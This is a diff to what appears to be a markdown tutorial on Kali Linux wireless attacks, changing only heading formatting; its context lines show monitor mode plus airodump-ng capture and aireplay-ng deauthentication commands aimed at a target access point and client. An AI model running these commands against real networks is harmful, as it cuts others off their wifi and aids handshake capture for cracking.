@@ -56,7 +56,7 @@ iwconfig                                     \\check mode: monitor
 
 
 
-Deauthentication Attack[for educational purpose only]
+### Deauthentication Attack[for educational purpose only]
 
 
 
@@ -67,7 +67,7 @@ airodump-ng --bssid <id> --channel <ch> --write test wlan0
 aireplay-ng --deauth [any no.] -a <bssid> -c <station id> wlan0
 
 
-Important note: 
+## Important note: 
 
 If after restarting your kali machine doesn't recognise your device..
 As lot of people are facing the same problem ..
